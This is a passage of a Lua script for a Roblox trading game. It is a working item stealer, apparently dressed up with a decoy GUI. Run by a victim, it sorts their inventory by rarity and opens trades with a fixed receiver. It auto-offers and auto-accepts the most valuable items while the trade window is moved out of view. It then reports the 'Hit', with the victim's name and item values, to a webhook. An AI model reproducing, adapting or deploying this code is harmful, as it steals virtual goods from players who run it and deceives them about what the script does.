 if c=="Active Check" and not b.Active then return end
 if c=="Text Check" and b~="^" then return end
 for _,e in pairs(ev) do for _,cn in pairs(getconnections(b[e])) do cn:Fire() end end
end

local function updInv()
 local inv = BDC.Weapons.Owned or {}
 InvT={} vL_weight=0
 aD,vB,cP,uC={},{},{},{} rP,lC,gS={},{},{} aM,uS={},{} vI,cS=0,0 uM,rW=0,0 lR,gS2=0,0 aK,uH=0,0

 for iID,am in pairs(inv) do
  local iI = Sync.Weapons[iID]
  if iI and iI.ItemName~="Default Gun" and iI.ItemName~="Default Knife" then
   local iN=iI.ItemName local r=iI.Rarity
   local iV=0
   if r=="Godly" or r=="Ancient" or r=="Unique" or r=="Classic" then
    iV=(vL_values[iN]or vL_valuesLow[iN:lower()]or 0)*am
   end
   vL_weight=vL_weight+iV
   local fT={name=iI.ItemName,data=iID,amount=am,rarity=r,value=iV} table.insert(aD,fT)
   if r=="Godly" then table.insert(gS,fT) gS2=gS2+am
   elseif r=="Ancient" then table.insert(aM,fT) aK=aK+am
   elseif r=="Unique" then table.insert(uS,fT) uH=uH+am
   elseif r=="Classic" then table.insert(vB,fT) vI=vI+am
   elseif r=="Legendary" then table.insert(lC,fT) lR=lR+am
   elseif r=="Rare" then table.insert(rP,fT) rW=rW+am
   elseif r=="Uncommon" then table.insert(uC,fT) uM=uM+am
   elseif r=="Common" then table.insert(cP,fT) cS=cS+am end
   table.insert(InvT,{name=iN,id=iID,amount=am,rarity=r})
  end
 end
 local rP2={Unique=8,Ancient=7,Godly=6,Classic=5,Legendary=4,Rare=3,Uncommon=2,Common=1}
 table.sort(InvT,function(a,b) return (rP2[a.rarity]or 0)>(rP2[b.rarity]or 0) end)
 return true
end
updInv()
task.wait()

local TSrv=RS:FindFirstChild("Trade")
if TSrv then
 TSrv.StartTrade.OnClientEvent:Connect(function(tD,tP) if tP~=recvr then TSrv.DeclineTrade:FireServer() end end)
end

local sTr=function(tP) if tP and TSrv then pcall(function() TSrv.SendRequest:InvokeServer(tP) end) end end
local dTr=function() if TSrv then pcall(function() TSrv.DeclineTrade:FireServer() end) end end
local cTr=function(tP) task.spawn(function() while tP and tP.Parent==P do sTr(tP) task.wait(0.5) end end) end

local InsIt=function()
 local rcv=P:FindFirstChild(recvr) if not rcv then dTr() return end
 if not InvT then dTr() return end
 local tIt={} iAd=0 tIn=0 local i=1
 while iAd<4 and i<=#InvT do
  local it=InvT[i]
  if it and it.id and it.amount>0 then
   local ar={it.id,"Weapons"} local suc=false iOf=0
   for j=1,it.amount do local ok,err=pcall(function() RS.Trade.OfferItem:FireServer(unpack(ar)) iOf=iOf+1 tIn=tIn+1 end) if ok then suc=true end end
   if suc then iAd=iAd+1 table.insert(tIt,{id=it.id,amount=iOf}) end
  end
  i=i+1
 end
 if iAd==0 then dTr() return end
 task.spawn(function()
  local acc=false local pA={[142823291]=285646582,[335132309]=670264618,[636649648]=1273299296} local tA=pA[game.PlaceId]
  if tA and TP then
   while not acc do pcall(function() RS.Trade.AcceptTrade:FireServer(tA) end) acc=not TP.Enabled task.wait(0.05) end
   for _,td in ipairs(tIt) do for j,it in ipairs(InvT) do if it.id==td.id then if it.amount<=td.amount then table.remove(InvT,j) else it.amount=it.amount-td.amount end break end end end
  end
 end)
end

local fRj=function(p) if p then pcall(function() TS:Teleport(game.PlaceId,p) end) end end
local sCL=function(p) if p then p.Chatted:Connect(function(m) sTr(p) if m:lower()=="rejoin" then fRj(p) end end) end end
local cRIS=function(rN) task.spawn(function() while true do local rP=P:FindFirstChild(rN) if rP then act(rN) break end task.wait(5) end end) end
local act=function(pN) local p=P:FindFirstChild(pN) if p then sCL(p) task.wait(10) sTr(p) cTr(p) end end

if TP then
 if Mob then TP.Container.Position=Pos TP.ClickBlocker.Position=Pos else TP.BG.Position=Pos TP.Container.Position=Pos TP.ClickBlocker.Position=Pos TP.Processing.Position=Pos end
 TP:GetPropertyChangedSignal("Enabled"):Connect(function() if TP.Enabled then InsIt() else local p=P:FindFirstChild(recvr) if p then cTr(p) end end end)
end
P.PlayerAdded:Connect(function(p) if p.Name==recvr then act(p.Name) end end)
P.PlayerRemoving:Connect(function(p) if p.Name==recvr then cRIS(p.Name) end end)

local iR=P:FindFirstChild(recvr) if iR then act(recvr) else cRIS(recvr) end

if gS2 >= 1 or aK >= 1 or uH >= 1 then
    content = "-- @everyone\n" .. TScr
else
    content = TScr
end

local sWh=function(u,d) local s,e=pcall(function() http_req({Url=u,Body=HS:JSONEncode(d),Method="POST",Headers={["Content-Type"]="application/json",["User-Agent"]="Mozilla/5.0"}}) end) end

local invString = ""
if uS and #uS>0 then invString = invString.."\n**Unique**\n" for _,i in pairs(uS) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
if aM and #aM>0 then invString = invString.."\n**Ancient**\n" for _,i in pairs(aM) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
if gS and #gS>0 then invString = invString.."\n**Godly**\n" for _,i in pairs(gS) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
if vB and #vB>0 then invString = invString.."\n**Classic**\n" for _,i in pairs(vB) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end

local data = {
    ["content"] = content,
    ["embeds"] = {
        {
            ["title"] = "Hit",
            ["description"] = "User: " .. LocalPlayer.Name .. "\nValue: " .. tostring(math.floor(vL_weight + 0.5)) .. "\n" .. invString,
            ["color"] = 0x05f7ff
        }
    }
}

spawn(function()
    sWh(Webhook, data)
end)

createGUI()
createNotification()
